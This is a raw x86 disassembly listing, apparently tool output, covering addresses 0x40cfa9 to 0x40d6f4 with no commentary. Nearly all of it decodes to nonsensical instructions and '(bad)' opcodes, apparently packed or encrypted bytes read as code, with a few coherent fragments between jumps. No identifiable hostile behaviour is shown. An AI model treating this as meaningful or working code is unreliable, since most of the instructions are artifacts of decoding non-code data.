  40cfa9:	inc    esp
  40cfaa:	popf   
  40cfab:	dec    ecx
  40cfac:	rol    bl,cl
  40cfae:	sub    al,0x3
  40cfb0:	in     eax,dx
  40cfb1:	fwait
  40cfb2:	popf   
  40cfb3:	add    eax,0x20e29278
  40cfb8:	push   ebx
  40cfb9:	push   esp
  40cfba:	enter  0x533b,0xe
  40cfbe:	mov    cs,ecx
  40cfc0:	gs icebp 
  40cfc2:	push   0x3e
  40cfc4:	out    dx,al
  40cfc5:	sbb    al,0x1b
  40cfc7:	sub    DWORD PTR [ecx-0x7e025b06],edi
  40cfcd:	inc    eax
  40cfce:	sbb    cl,cl
  40cfd0:	cs ds adc ebx,esi
  40cfd4:	add    al,0xd0
  40cfd6:	les    edi,FWORD PTR [edx]
  40cfd8:	inc    ebx
  40cfd9:	push   es
  40cfda:	outs   dx,BYTE PTR ds:[esi]
  40cfdb:	stos   DWORD PTR es:[edi],eax
  40cfdc:	fadd   DWORD PTR [esi+0x30630b0a]
  40cfe2:	in     eax,dx
  40cfe3:	push   ss
  40cfe4:	xor    eax,0x384f588f
  40cfe9:	mov    ebp,0x32398bdb
  40cfee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfef:	cmp    DWORD PTR [edi+edx*4-0x6f493c35],esp
  40cff6:	add    bh,BYTE PTR [esi-0x45649ac1]
  40cffc:	outs   dx,DWORD PTR ds:[esi]
  40cffd:	std    
  40cffe:	mov    ah,0xd3
  40d000:	push   eax
  40d001:	mov    esi,0x8ab9afea
  40d006:	lea    edi,[edx]
  40d008:	sub    eax,0x8466624d
  40d00d:	rcl    eax,1
  40d00f:	aas    
  40d010:	inc    ebx
  40d011:	mov    ecx,0x2b8c04c3
  40d016:	retf   0xf340
  40d019:	jae    0x40cfaf
  40d01b:	jbe    0x40d065
  40d01d:	xchg   ebx,eax
  40d01e:	mov    WORD PTR [edi],gs
  40d020:	(bad)  
  40d021:	jmp    0x5aff:0xd727ec1d
  40d028:	xchg   ebp,eax
  40d029:	jecxz  0x40d009
  40d02b:	cs lock jmp 0x40d063
  40d02f:	cmp    BYTE PTR [ecx-0x45],dh
  40d032:	pop    ecx
  40d033:	(bad)  
  40d034:	aad    0x8
  40d036:	sbb    ebx,DWORD PTR ss:[ebp+ebp*8+0x223361a2]
  40d03e:	shl    BYTE PTR [ebx+0x6f89c88d],1
  40d044:	xchg   edi,ebp
  40d046:	scas   eax,DWORD PTR es:[edi]
  40d047:	cld    
  40d048:	jmp    0x9fea:0x97d8f550
  40d04f:	lock sub BYTE PTR [ebp-0x18],cl
  40d053:	xor    al,0x72
  40d055:	xor    ch,al
  40d057:	ror    DWORD PTR [ecx+0x4a],1
  40d05a:	xchg   ecx,eax
  40d05b:	(bad)  [ebp-0x1e]
  40d05e:	inc    ebx
  40d05f:	jnp    0x40d047
  40d061:	xchg   edx,eax
  40d062:	dec    eax
  40d063:	adc    esp,DWORD PTR [edi+0x2cf19be2]
  40d069:	mov    WORD PTR [ecx-0x4aea9b5a],ss
  40d06f:	and    al,0xe1
  40d071:	push   edx
  40d072:	and    eax,ebp
  40d074:	mul    DWORD PTR ds:0xd72befcc
  40d07a:	scas   al,BYTE PTR es:[edi]
  40d07b:	outs   dx,DWORD PTR ds:[esi]
  40d07c:	(bad)  
  40d07d:	xor    edi,DWORD PTR [esi-0x528399c1]
  40d083:	ins    BYTE PTR es:[edi],dx
  40d084:	add    ecx,DWORD PTR [ecx+esi*4]
  40d087:	(bad)  
  40d088:	int    0x47
  40d08a:	adc    al,0xb8
  40d08c:	jmp    0x83873397
  40d091:	data16 mov bh,0xb
  40d094:	sahf   
  40d095:	lods   eax,DWORD PTR ds:[esi]
  40d096:	and    eax,0x3ad295e6
  40d09b:	paddq  mm1,QWORD PTR [edx+0x4aed9a6a]
  40d0a2:	pop    edx
  40d0a3:	std    
  40d0a4:	add    edi,DWORD PTR [esi+eiz*8+0xc]
  40d0a8:	add    al,0x79
  40d0aa:	mov    al,ah
  40d0ac:	fs pop ebp
  40d0ae:	popf   
  40d0af:	dec    edx
  40d0b0:	pop    edi
  40d0b1:	mov    ah,0xa3
  40d0b3:	or     bl,BYTE PTR [edx-0x69c89d85]
  40d0b9:	ror    ebx,0x28
  40d0bc:	arpl   WORD PTR [eax],sp
  40d0be:	xor    BYTE PTR [eiz*1-0x79f0428c],dh
  40d0c5:	data16 lock (bad) 
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ecx,FWORD PTR [ebx]
  40d0ef:	imul   eax,edx,0x709daaed
  40d0f5:	jo     0x40d096
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d12e
  40d0fb:	cmp    esi,DWORD PTR [edx-0x74c070f]
  40d101:	mov    eax,ds:0x29af3ebe
  40d106:	jns    0x40d121
  40d108:	psubb  mm4,mm7
  40d10b:	hlt    
  40d10c:	xchg   esp,eax
  40d10d:	bound  esi,QWORD PTR [ecx-0x76]
  40d110:	xchg   DWORD PTR ds:0x2f3343b,esi
  40d116:	std    
  40d117:	mov    DWORD PTR [ebp+edx*8-0x1d],edi
  40d11b:	cmp    DWORD PTR ds:0xff42169d,edx
  40d121:	addr16 jae 0x40d13f
  40d124:	cli    
  40d125:	iret   
  40d126:	cmp    edi,DWORD PTR [ebx-0x3a]
  40d129:	into   
  40d12a:	mov    es,eax
  40d12c:	(bad)  
  40d12e:	xchg   BYTE PTR [esi+0x7f060110],ch
  40d134:	push   0xfb94fce6
  40d139:	pop    ebx
  40d13a:	add    BYTE PTR [eax-0x710278bb],ah
  40d140:	shr    DWORD PTR [edi-0x65dbb30a],0x14
  40d147:	jecxz  0x40d167
  40d149:	xchg   edi,eax
  40d14a:	jp     0x40d15d
  40d14c:	pop    ebp
  40d14d:	cmp    ebp,DWORD PTR [ebx-0x1d]
  40d150:	dec    edx
  40d151:	pop    esi
  40d152:	or     eax,0x94c11946
  40d157:	pop    ebp
  40d158:	aas    
  40d159:	mov    BYTE PTR [edi+ecx*8+0x73efdbd8],ah
  40d160:	jecxz  0x40d158
  40d162:	das    
  40d163:	fwait
  40d164:	dec    ebp
  40d165:	inc    BYTE PTR [edx+0x26]
  40d168:	in     eax,0xdc
  40d16a:	stos   DWORD PTR es:[edi],eax
  40d16b:	out    dx,eax
  40d16c:	sti    
  40d16d:	xchg   ecx,eax
  40d16e:	stos   BYTE PTR es:[edi],al
  40d16f:	test   al,0x3c
  40d171:	fs add eax,0xeb70626f
  40d177:	scas   al,BYTE PTR es:[edi]
  40d178:	inc    eax
  40d179:	mov    dl,0x96
  40d17b:	enter  0xdf84,0x6d
  40d17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d180:	xchg   ebx,eax
  40d181:	xchg   ebx,eax
  40d182:	fmul   QWORD PTR [esi+0x17892147]
  40d188:	or     edi,eax
  40d18a:	dec    edi
  40d18b:	adc    bl,BYTE PTR [eax-0x47]
  40d18e:	mov    ebx,0xcd53881b
  40d193:	add    ecx,DWORD PTR [esi+0x77]
  40d196:	ins    BYTE PTR es:[edi],dx
  40d197:	clc    
  40d198:	sar    DWORD PTR [ebx],0x49
  40d19b:	xor    BYTE PTR [esi+edx*2],bl
  40d19e:	(bad)  
  40d19f:	xor    eax,ecx
  40d1a1:	dec    edi
  40d1a2:	push   ebx
  40d1a3:	scas   al,BYTE PTR es:[edi]
  40d1a4:	adc    edx,DWORD PTR [edi-0x47]
  40d1a7:	mov    dl,0xcd
  40d1a9:	mov    cl,0x80
  40d1ab:	loope  0x40d17b
  40d1ad:	dec    ebx
  40d1ae:	inc    ebx
  40d1af:	inc    esi
  40d1b0:	inc    ebx
  40d1b1:	inc    ebp
  40d1b2:	iret   
  40d1b3:	pop    eax
  40d1b4:	add    edx,esi
  40d1b6:	cmp    esp,0x4b
  40d1b9:	sub    eax,ebp
  40d1bb:	mov    ebx,0xc6d2f3bd
  40d1c0:	mov    esp,0x64a0c164
  40d1c5:	cwde   
  40d1c6:	add    BYTE PTR ds:0x5949f361,0xd8
  40d1cd:	adc    eax,0x9a2f2b48
  40d1d2:	sti    
  40d1d3:	shr    BYTE PTR [edi-0x3ef2cfec],0x73
  40d1da:	(bad)  
  40d1dc:	mov    edx,esi
  40d1de:	jle    0x40d167
  40d1e0:	loope  0x40d1d4
  40d1e2:	mov    DWORD PTR [ecx],0x127e6683
  40d1e8:	pop    ds
  40d1e9:	fldenv [ebx+0x57]
  40d1ec:	push   edi
  40d1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ee:	inc    edx
  40d1ef:	mov    dh,0x12
  40d1f1:	bnd jmp 0xd9bde4e4
  40d1f7:	fld    DWORD PTR [ebp-0x66b83a5e]
  40d1fd:	mov    DWORD PTR [edx],edi
  40d1ff:	xor    ebp,edi
  40d201:	push   0xfffffff3
  40d203:	xchg   ebx,eax
  40d204:	iret   
  40d205:	xchg   esi,eax
  40d206:	cmp    bh,al
  40d208:	push   cs
  40d209:	and    ebp,DWORD PTR [ebx+0x5919bd92]
  40d20f:	xchg   ecx,eax
  40d210:	into   
  40d211:	sub    bh,BYTE PTR [edx+ecx*4]
  40d214:	and    dl,dl
  40d216:	jl     0x40d1a1
  40d218:	loop   0x40d1b1
  40d21a:	leave  
  40d21b:	sub    DWORD PTR [ebx],ebp
  40d21d:	out    dx,eax
  40d21e:	lock jge 0x40d27c
  40d221:	leave  
  40d222:	jns    0x40d20c
  40d224:	test   eax,0xc4e65f06
  40d229:	ins    DWORD PTR es:[edi],dx
  40d22a:	or     al,0xc
  40d22c:	dec    ebx
  40d22d:	push   esp
  40d22e:	lahf   
  40d22f:	dec    edi
  40d230:	cmp    DWORD PTR [ebx-0x28],ebx
  40d233:	div    BYTE PTR ds:[esi+0x30e4bbfa]
  40d23a:	jecxz  0x40d1d6
  40d23c:	adc    al,0xb2
  40d23e:	mov    dh,BYTE PTR [ebp+0x591f433]
  40d244:	and    eax,0x2a86df97
  40d249:	adc    BYTE PTR [esi+0x10],bl
  40d24c:	daa    
  40d24d:	dec    ebp
  40d24e:	mov    WORD PTR [ecx],gs
  40d250:	and    dh,BYTE PTR [eax]
  40d252:	aam    0xea
  40d254:	fild   QWORD PTR [esi-0x15fb7adc]
  40d25a:	push   eax
  40d25b:	ror    BYTE PTR [ebx+ebp*8],0x22
  40d25f:	in     al,dx
  40d260:	mov    ch,0xd1
  40d262:	loope  0x40d1f1
  40d264:	imul   ebp,DWORD PTR [ebx],0x4ad83b55
  40d26a:	es push edi
  40d26c:	loope  0x40d21f
  40d26e:	and    ebp,DWORD PTR [ebp+ebp*4+0x36]
  40d272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d273:	add    al,0xbc
  40d275:	mov    dh,0xb4
  40d277:	xchg   esp,eax
  40d278:	jb     0x40d268
  40d27a:	pop    ss
  40d27b:	fs scas al,BYTE PTR es:[edi]
  40d27d:	inc    edx
  40d27e:	sub    eax,0x88c7a323
  40d283:	push   ecx
  40d284:	add    DWORD PTR [edi],eax
  40d286:	lds    edi,FWORD PTR [edx+0x1a]
  40d289:	xor    BYTE PTR [edx+0x2],cl
  40d28c:	sti    
  40d28d:	xchg   ecx,eax
  40d28e:	shl    BYTE PTR [edx],0x1a
  40d291:	dec    edx
  40d292:	repnz dec esi
  40d294:	inc    esp
  40d295:	das    
  40d296:	ins    BYTE PTR es:[edi],dx
  40d297:	pop    esi
  40d298:	cmp    cl,bh
  40d29a:	cmp    eax,0x9b4305e4
  40d29f:	adc    al,0x17
  40d2a1:	mov    cl,0xe8
  40d2a3:	mov    dh,0xb0
  40d2a5:	pop    esi
  40d2a6:	and    edx,esi
  40d2a8:	pop    eax
  40d2a9:	aam    0x81
  40d2ab:	mov    ch,0x72
  40d2ad:	fwait
  40d2ae:	mov    ah,0x99
  40d2b0:	lds    esp,FWORD PTR [esp+edi*2-0x7645e85f]
  40d2b7:	jo     0x40d297
  40d2b9:	call   0xdb979295
  40d2be:	jne    0x40d242
  40d2c0:	push   ax
  40d2c2:	neg    BYTE PTR [ebx]
  40d2c4:	ret    0x2925
  40d2c7:	popa   
  40d2c8:	sti    
  40d2c9:	xchg   esp,eax
  40d2ca:	cdq    
  40d2cb:	div    esi
  40d2cd:	or     al,0xb5
  40d2cf:	data16 mov dh,0x12
  40d2d2:	xor    BYTE PTR [edi-0x45],bh
  40d2d5:	and    DWORD PTR [edi-0x61b79d7f],esi
  40d2db:	xchg   ecx,eax
  40d2dc:	push   cs
  40d2dd:	mov    cl,0x97
  40d2df:	rcr    DWORD PTR [esi+0x3d1d6f03],1
  40d2e5:	push   edx
  40d2e6:	sub    ecx,DWORD PTR [ebp-0x51]
  40d2e9:	push   es
  40d2ea:	outs   dx,BYTE PTR ds:[esi]
  40d2eb:	mov    al,ds:0xd379441f
  40d2f0:	out    0x74,eax
  40d2f2:	js     0x40d310
  40d2f4:	xchg   edi,eax
  40d2f5:	(bad)  
  40d2f6:	sar    dh,1
  40d2f8:	mov    al,0x78
  40d2fa:	sbb    eax,0x59745c03
  40d2ff:	mov    edi,0x62da850c
  40d304:	add    eax,0x4b42883c
  40d309:	pop    ebx
  40d30a:	push   es
  40d30b:	hlt    
  40d30c:	mov    esi,0xbc95b009
  40d311:	call   0x37d4:0x7f7630a0
  40d318:	xchg   esp,eax
  40d319:	shr    BYTE PTR [edi+0x2b],cl
  40d31c:	aam    0x2c
  40d31e:	fsubr  st,st(4)
  40d320:	adc    BYTE PTR [ebx+0x247a9b0b],dl
  40d326:	sub    al,0x2b
  40d328:	scas   al,BYTE PTR es:[edi]
  40d329:	pop    ebx
  40d32a:	adc    BYTE PTR [ecx+0x64],dh
  40d32d:	scas   al,BYTE PTR es:[edi]
  40d32e:	sub    al,0x90
  40d330:	(bad)  
  40d331:	aam    0x47
  40d333:	aas    
  40d334:	or     edi,DWORD PTR [edi+0x3c302df2]
  40d33a:	mov    DWORD PTR [edx],eax
  40d33c:	test   eax,0x5248b3c7
  40d341:	mov    eax,0xcea68fe9
  40d346:	cmp    al,0xe
  40d348:	push   ebx
  40d349:	add    BYTE PTR [esi-0x70b297ba],ah
  40d34f:	or     DWORD PTR [ecx-0x2f080271],0x688a6f54
  40d359:	rcl    DWORD PTR [ecx+0x73],1
  40d35c:	and    al,0x5
  40d35e:	cmp    ebx,DWORD PTR [edx+0x646fd8dd]
  40d364:	xchg   edx,eax
  40d365:	push   ds
  40d366:	nop
  40d367:	mov    ah,0xf7
  40d369:	call   0xaa7bb909
  40d36e:	xchg   esp,eax
  40d36f:	cli    
  40d370:	cwde   
  40d371:	adc    DWORD PTR [ebx-0x238f0a43],0xffffff8d
  40d378:	fstp   DWORD PTR [edx+0x25174f1]
  40d37e:	and    edi,DWORD PTR [ebx-0x3d]
  40d381:	mov    edi,0x83f66872
  40d386:	sub    DWORD PTR [edi+0x4a],ebx
  40d389:	icebp  
  40d38a:	or     DWORD PTR [esi+0x6b],edx
  40d38d:	arpl   WORD PTR [edx-0x60a45e9b],sp
  40d393:	(bad)  
  40d394:	(bad)
  40d398:	sbb    BYTE PTR [edi-0x5b],0x84
  40d39c:	in     al,0xd5
  40d39e:	stc    
  40d39f:	sbb    ebx,DWORD PTR [ecx-0x1aa63e80]
  40d3a5:	(bad)  
  40d3a6:	aam    0x23
  40d3a8:	pop    esi
  40d3a9:	sahf   
  40d3aa:	fs mov dx,bp
  40d3ae:	cmp    DWORD PTR [edx],ecx
  40d3b0:	xor    eax,0x52909543
  40d3b5:	dec    ebx
  40d3b6:	mov    dh,0xc4
  40d3b8:	daa    
  40d3b9:	jp     0x40d373
  40d3bb:	lods   eax,DWORD PTR ds:[esi]
  40d3bc:	fnstcw WORD PTR [edi]
  40d3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3bf:	int    0xf8
  40d3c1:	xlat   BYTE PTR ds:[ebx]
  40d3c2:	pop    ecx
  40d3c3:	mov    bl,0x47
  40d3c5:	fld    TBYTE PTR [edi]
  40d3c7:	mov    cs,WORD PTR [ecx-0xd3efd30]
  40d3cd:	pop    ss
  40d3ce:	dec    eax
  40d3cf:	inc    ebp
  40d3d0:	mov    ?,WORD PTR [edi]
  40d3d2:	popa   
  40d3d3:	inc    ebp
  40d3d4:	test   BYTE PTR [ecx+edi*4-0x26],bh
  40d3d8:	pop    edx
  40d3d9:	xor    eax,0x7999260
  40d3de:	inc    eax
  40d3df:	inc    edi
  40d3e0:	popa   
  40d3e1:	cmp    bh,BYTE PTR [eax]
  40d3e3:	mov    esp,0x7ce0d431
  40d3e8:	iret   
  40d3e9:	push   eax
  40d3ea:	cmp    BYTE PTR [ecx+eax*2+0x15],dh
  40d3ee:	pop    es
  40d3ef:	and    dh,dh
  40d3f1:	mov    WORD PTR [edx-0x46582639],gs
  40d3f7:	add    BYTE PTR [edx-0x2e],0x79
  40d3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3fc:	mov    ebp,0x3bde1c22
  40d401:	shl    dl,0xb1
  40d404:	(bad)  
  40d405:	loopne 0x40d398
  40d407:	dec    eax
  40d408:	loop   0x40d3a4
  40d40a:	leave  
  40d40b:	js     0x40d440
  40d40d:	jae    0x40d3a2
  40d40f:	dec    esi
  40d410:	dec    esi
  40d411:	pop    ecx
  40d412:	pop    ss
  40d413:	jge    0x40d448
  40d415:	sub    DWORD PTR [ebx+ecx*2+0xcb81012],ebx
  40d41c:	hlt    
  40d41d:	inc    ch
  40d41f:	scas   eax,DWORD PTR es:[edi]
  40d420:	add    DWORD PTR [edx*8-0xca9b820],eax
  40d427:	or     DWORD PTR [ebx-0x7f],esi
  40d42a:	sahf   
  40d42b:	cmp    edx,DWORD PTR [ecx]
  40d42d:	xchg   ebx,eax
  40d42e:	inc    esp
  40d42f:	push   ebp
  40d430:	mov    ch,0x24
  40d432:	sbb    eax,0x49cadacb
  40d437:	push   eax
  40d438:	and    DWORD PTR [ecx+0x3aea8196],esi
  40d43e:	adc    DWORD PTR [edi-0x5acbb39],ebx
  40d444:	shr    BYTE PTR [ecx+0x440f0ed6],0x5b
  40d44b:	cli    
  40d44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d44d:	lods   al,BYTE PTR ds:[esi]
  40d44e:	jle    0x40d48b
  40d450:	push   ebx
  40d451:	(bad)  
  40d452:	repz aaa 
  40d454:	fs jbe 0x40d48a
  40d457:	sub    al,0xea
  40d459:	outs   dx,BYTE PTR ds:[esi]
  40d45a:	nop
  40d45b:	cmp    eax,0x55831558
  40d460:	dec    ebx
  40d461:	push   ebp
  40d462:	std    
  40d463:	(bad)  
  40d464:	xchg   ecx,eax
  40d465:	stos   DWORD PTR es:[edi],eax
  40d466:	out    0x15,eax
  40d468:	jns    0x40d47c
  40d46a:	xor    al,0x8c
  40d46c:	scas   al,BYTE PTR es:[edi]
  40d46d:	pop    esp
  40d46e:	cdq    
  40d46f:	outs   dx,BYTE PTR ds:[esi]
  40d470:	dec    ecx
  40d471:	mov    cl,0xc0
  40d473:	xor    DWORD PTR [ebp+0x40b56806],edx
  40d479:	ret    
  40d47a:	sub    DWORD PTR es:[ecx-0x47],esi
  40d47e:	cs pop ebp
  40d480:	icebp  
  40d481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d482:	loope  0x40d4af
  40d484:	and    edi,edx
  40d486:	inc    edi
  40d487:	sub    al,0x99
  40d489:	mov    bh,0x2b
  40d48b:	adc    al,0xf3
  40d48d:	fsubr  st(1),st
  40d48f:	stos   BYTE PTR es:[edi],al
  40d490:	ds cmp edi,0x9020956f
  40d497:	pop    es
  40d498:	jmp    0x7dcc2a52
  40d49d:	clc    
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xebd3:0xb81a1d63
  40d4c6:	pop    esi
  40d4c7:	cmp    BYTE PTR [edi-0x37],dh
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4de
  40d4d2:	and    al,BYTE PTR [ecx]
  40d4d4:	iret   
  40d4d5:	cmc    
  40d4d6:	std    
  40d4d7:	in     eax,dx
  40d4d8:	mov    eax,0x102a1588
  40d4dd:	fisttp DWORD PTR [eax+0x38]
  40d4e0:	(bad)
  40d4e4:	xchg   esi,ebp
  40d4e6:	imul   esi,DWORD PTR [ebp-0x423df200],0x17
  40d4ed:	xor    al,0xf
  40d4ef:	test   esp,edx
  40d4f1:	cdq    
  40d4f2:	inc    ecx
  40d4f3:	sub    al,0x4d
  40d4f5:	lods   eax,DWORD PTR ds:[esi]
  40d4f6:	lahf   
  40d4f7:	rcl    BYTE PTR [eax],cl
  40d4f9:	ret    0x342b
  40d4fc:	jge    0x40d52d
  40d4fe:	xor    esp,esi
  40d500:	enter  0x8cd3,0x21
  40d504:	out    dx,eax
  40d505:	mov    bh,0x2
  40d507:	sbb    BYTE PTR [edx],cl
  40d509:	mov    ecx,0x6a0f2f69
  40d50e:	or     ebx,DWORD PTR [edi-0x209056c3]
  40d514:	mov    al,ds:0x22ddd6ef
  40d519:	and    esi,edx
  40d51b:	sbb    eax,DWORD PTR [ecx]
  40d51d:	inc    ecx
  40d51e:	mov    al,ds:0x4918ca3
  40d523:	fdiv   DWORD PTR ds:[ecx+0x5336ae48]
  40d52a:	sub    ebx,edx
  40d52c:	push   esi
  40d52d:	loop   0x40d591
  40d52f:	lahf   
  40d530:	mov    edi,0xd04f451e
  40d535:	push   0xb943556c
  40d53a:	mov    al,ds:0xd4827bbb
  40d53f:	mov    ecx,0x1a5c23bb
  40d544:	cmp    BYTE PTR [edi],ah
  40d546:	sbb    DWORD PTR [edi+ebp*4+0x19f2aea4],0x3a
  40d54e:	or     DWORD PTR [eax+edx*1],ebp
  40d551:	pop    ecx
  40d552:	(bad)  
  40d553:	std    
  40d554:	call   FWORD PTR [ecx-0x6f]
  40d557:	(bad)  
  40d559:	pop    ebx
  40d55a:	icebp  
  40d55b:	icebp  
  40d55c:	push   ss
  40d55d:	ds popa 
  40d55f:	daa    
  40d560:	mov    ah,0xae
  40d563:	push   eax
  40d564:	out    dx,al
  40d565:	xchg   ebp,eax
  40d566:	jmp    0x40d518
  40d568:	pop    ecx
  40d569:	push   ebp
  40d56a:	xor    al,0xbc
  40d56c:	pop    eax
  40d56d:	stos   DWORD PTR es:[edi],eax
  40d56e:	sub    DWORD PTR [esi+0x12],edx
  40d571:	int3   
  40d572:	(bad)  
  40d573:	and    eax,0x9fa36fc8
  40d578:	js     0x40d592
  40d57a:	scas   al,BYTE PTR es:[edi]
  40d57b:	lods   eax,DWORD PTR ds:[esi]
  40d57c:	inc    esi
  40d57d:	mov    esi,eax
  40d57f:	cs loopne 0x40d50e
  40d582:	pop    eax
  40d583:	dec    edx
  40d584:	inc    esp
  40d585:	pop    esp
  40d586:	pushf  
  40d587:	cmp    al,0xaf
  40d589:	adc    al,0x1e
  40d58b:	jmp    0x40d535
  40d58d:	test   eax,0xd2cf7420
  40d592:	call   0xcbca136
  40d597:	ror    al,0x4
  40d59a:	add    BYTE PTR [edi-0x1423fb86],0x86
  40d5a1:	jns    0x40d542
  40d5a3:	add    BYTE PTR [ecx],bh
  40d5a5:	idiv   BYTE PTR [edi-0x2d99c05e]
  40d5ab:	push   cs
  40d5ac:	mov    ds:0x410398fc,eax
  40d5b1:	call   0xf182:0xe194a6ec
  40d5b8:	ret    0x1653
  40d5bb:	push   edi
  40d5bc:	ins    BYTE PTR es:[edi],dx
  40d5bd:	out    0x44,eax
  40d5bf:	pop    eax
  40d5c0:	scas   eax,DWORD PTR es:[edi]
  40d5c1:	mov    bh,0x80
  40d5c3:	inc    esp
  40d5c4:	jne    0x40d5cf
  40d5c6:	cld    
  40d5c7:	into   
  40d5c8:	test   eax,ecx
  40d5ca:	pop    edx
  40d5cb:	adc    al,0xbe
  40d5cd:	and    eax,0xa8ddac6f
  40d5d2:	in     al,0x6b
  40d5d4:	jae    0x40d5bc
  40d5d6:	call   0x32abea8
  40d5db:	inc    ecx
  40d5dc:	cmp    bl,BYTE PTR [edx+ebp*2-0x662c7917]
  40d5e3:	and    esp,DWORD PTR [eax-0x6c3a065f]
  40d5e9:	retf   
  40d5ea:	test   eax,0xb778adc7
  40d5ef:	inc    ebx
  40d5f0:	push   ebp
  40d5f1:	movsx  edi,BYTE PTR [esi+0x6a]
  40d5f5:	in     al,0x7
  40d5f7:	ds pushf 
  40d5f9:	inc    eax
  40d5fa:	popf   
  40d5fb:	stos   BYTE PTR es:[edi],al
  40d5fc:	mov    edx,DWORD PTR [eax+0x430b3abc]
  40d602:	sar    DWORD PTR [esi],cl
  40d604:	jnp    0x40d58a
  40d606:	pop    esp
  40d607:	xchg   BYTE PTR [esp+edi*4],cl
  40d60a:	imul   eax,DWORD PTR [edi+0x59],0xffffffff
  40d60e:	sbb    al,dl
  40d610:	lea    ebp,[ecx-0x3d]
  40d613:	ss hlt 
  40d615:	call   0x894c5808
  40d61a:	out    0x11,eax
  40d61c:	std    
  40d61d:	out    dx,eax
  40d61e:	pop    ebp
  40d61f:	das    
  40d620:	jge    0x40d618
  40d622:	stc    
  40d623:	fxch   st(0)
  40d625:	outs   dx,DWORD PTR ds:[esi]
  40d626:	adc    esi,DWORD PTR [edx+0x55b160d3]
  40d62c:	sub    eax,0xacfee185
  40d631:	bound  ebx,QWORD PTR [ecx+0x28f5f8f7]
  40d637:	xchg   ebp,eax
  40d638:	pop    es
  40d639:	push   esp
  40d63a:	sahf   
  40d63b:	leave  
  40d63c:	int    0x67
  40d63e:	sahf   
  40d63f:	xchg   esp,eax
  40d640:	ins    BYTE PTR es:[edi],dx
  40d641:	fs mov dl,0x5b
  40d644:	jbe    0x40d5cc
  40d646:	cld    
  40d647:	or     BYTE PTR [edi],dl
  40d649:	loop   0x40d5f9
  40d64b:	test   ch,0xfd
  40d64e:	retf   
  40d64f:	and    esp,DWORD PTR [ecx-0x55]
  40d652:	aam    0x26
  40d654:	or     ebx,DWORD PTR [ecx+eax*8+0x6]
  40d658:	pop    ds
  40d659:	sbb    DWORD PTR ds:0xebbcb4ce,eax
  40d65f:	cmp    BYTE PTR [esi-0x15f8960d],0x69
  40d666:	and    ecx,DWORD PTR [edi+0x33d1d213]
  40d66c:	or     DWORD PTR [esi],eax
  40d66e:	adc    eax,0x8a703716
  40d673:	sahf   
  40d674:	push   di
  40d676:	xchg   ebp,eax
  40d677:	sti    
  40d678:	jb     0x40d62a
  40d67a:	inc    esp
  40d67b:	pop    ebx
  40d67c:	sbb    BYTE PTR [bp+di+0x54],0xfc
  40d681:	pop    esp
  40d682:	(bad)  
  40d683:	xor    DWORD PTR [ebx],ecx
  40d685:	repz xchg esi,eax
  40d687:	mov    BYTE PTR [edx+edx*2+0x2c878b35],al
  40d68e:	pop    esp
  40d68f:	test   ebp,edx
  40d691:	lods   al,BYTE PTR ds:[esi]
  40d692:	sub    bl,BYTE PTR [edx]
  40d694:	out    dx,al
  40d695:	xchg   ecx,eax
  40d696:	cmp    eax,0xf4d2699b
  40d69b:	fst    QWORD PTR [eax]
  40d69d:	mov    edi,0x6ac9f64c
  40d6a2:	mov    edi,0xd14a1fae
  40d6a7:	sbb    al,0x24
  40d6a9:	jge    0x40d718
  40d6ab:	test   al,0x5f
  40d6ad:	dec    esi
  40d6ae:	iret   
  40d6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6b0:	(bad)  
  40d6b2:	pop    ecx
  40d6b3:	cdq    
  40d6b4:	leave  
  40d6b5:	rol    DWORD PTR [ecx+0x52bb34cd],cl
  40d6bb:	cld    
  40d6bc:	adc    eax,0xc1ca85ef
  40d6c1:	mov    edx,0xd91a152a
  40d6c6:	stos   BYTE PTR es:[edi],al
  40d6c7:	push   edx
  40d6c8:	(bad)  
  40d6ca:	mov    al,0xef
  40d6cc:	retf   
  40d6cd:	jge    0x40d652
  40d6cf:	jge    0x40d73c
  40d6d1:	stc    
  40d6d2:	lock jae 0x40d6ad
  40d6d5:	fimul  WORD PTR [ebx]
  40d6d7:	and    BYTE PTR [esp+eax*4+0x41],ch
  40d6db:	jle    0x40d6b5
  40d6dd:	pop    eax
  40d6de:	adc    ah,BYTE PTR [ebx-0x13]
  40d6e1:	test   BYTE PTR [eax+0x5b],dh
  40d6e4:	nop
  40d6e5:	pop    edx
  40d6e6:	je     0x40d742
  40d6e8:	cmp    al,0x80
  40d6ea:	scas   al,BYTE PTR es:[edi]
  40d6eb:	mov    esi,0x4d15bd02
  40d6f0:	aad    0xfc
  40d6f2:	cli    
  40d6f3:	(bad)  
  40d6f4:	sar    DWORD PTR [esi-0x3fbb7c86],cl
